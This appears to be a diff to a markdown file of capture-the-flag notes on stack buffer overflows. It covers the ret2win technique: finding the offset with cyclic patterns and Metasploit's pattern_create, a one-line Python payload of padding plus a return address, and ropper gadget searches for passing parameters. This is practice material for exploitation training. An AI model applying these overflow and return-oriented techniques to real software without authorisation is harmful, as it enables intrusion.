@@ -11,11 +11,20 @@ In ret2win, we need to execute the win function to get the flag by overwriting t
 - cyclic 100
 - run and check the RIP register which is the instruction pointer
 - cyclic -l <the four characters found>
-- Find the return address, objdump, ghidra
+- Find the return address, objdump, ghidra (disass <function name>)
+For 64 bit ELF, take the first 4 bytes of RSP to find the offset, it works differently than 32 bit design.
 
 python3 -c 'print("A"*offset+"return address")' > payload
 ./ret2win < payload
 ```
+`RET2WIN with parameters`
+
+![image](https://github.com/ckc9759/CTF_resources/assets/95117634/28a224bb-a00c-42bd-80c2-ec9967cd919e)
+```bash
+ropper --file <filename> --search "pop rdi"
+```
+
+---
 
 ```py
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
